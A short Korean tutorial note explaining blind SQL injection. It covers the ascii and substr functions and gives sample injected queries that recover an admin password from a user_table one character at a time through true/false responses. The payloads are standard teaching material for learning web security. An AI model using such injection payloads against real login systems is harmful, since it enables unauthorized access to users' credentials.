# Blind SQL Injection

<aside>
📢 해당 공격 기법은 `스무고개 게임`과 비슷한 매커니즘 !!

</aside>

질의 결과를 이용자가 화면에서 직접 확인하지 못할 때,

참 / 거짓 반환 결과로 데이터를 획득하는 공격 기법을 `Blind SQL Injection` 이라고 한다.

그 전에 쓰이는 공격에 쓰이는 함수들을 알아보자.

### ascii

---

전달된 문자를 `아스키 형태로 변환`하는 함수.

예를 들어 `ascii(’a’)` 를 실행하면 ‘a’ 문자의 아스키 값인 `97`을 반환.

### substr

---

> `substr(string, position, length)`
> 

substr 함수에 전달되는 인자는 위와 같다.

아래의 코드는 사용 예시

```sql
substr('ABCD',1,1) //결과값 = 'A'
substr('ABCD',2,2) //결과값 = 'BC'
```

## 공격코드

---

```sql
# 첫 번째 글자 구하기 (아스키 114 = 'r', 115 = 's'')
SELECT * FROM user_table WHERE uid='admin' and ascii(substr(upw,1,1))=114-- ' and upw=''; # False
SELECT * FROM user_table WHERE uid='admin' and ascii(substr(upw,1,1))=115-- ' and upw=''; # True
# 두 번째 글자 구하기 (아스키 115 = 's', 116 = 't')
SELECT * FROM user_table WHERE uid='admin' and ascii(substr(upw,2,1))=115-- ' and upw=''; # False
SELECT * FROM user_table WHERE uid='admin' and ascii(substr(upw,2,1))=116-- ' and upw=''; # True
```

이와 같이 참 / 거짓 반환 값을 통해 공격을 한다.

하지만 이렇게 공격을 하게 된다면 너무 `많은 시간`이 들고 `비효율적`이다.

따라서 대부분 `자동화 스크립트`를 짜서 공격을 한다.